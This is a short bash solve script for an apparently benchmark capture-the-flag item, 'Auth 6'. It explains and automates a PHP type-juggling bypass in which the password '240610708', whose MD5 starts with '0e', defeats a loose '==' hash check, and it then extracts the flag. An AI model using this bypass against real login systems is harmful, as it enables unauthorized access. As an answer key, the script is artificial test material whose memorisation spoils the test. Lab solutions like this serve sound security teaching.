#!/usr/bin/env bash
# XBEN-060-24 — "Auth 6" (tags: crypto, privilege_escalation, brute_force)
#
# `md5($_POST['password']) == '0e678703625362188185747119782643'`, with PHP's
# loose `==`. Two strings that both look like scientific notation are compared
# as numbers, and `0e…` is zero however many digits follow. So any input whose
# MD5 is `0e` followed by digits compares equal, and `240610708` is the
# best-known one. No brute force, despite the tag: the comparison is what breaks.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben060-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
REPLAY="$("$H5I" websec replay req_0 \
    --set 'method=POST' --set 'form.password=240610708' --create \
    --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
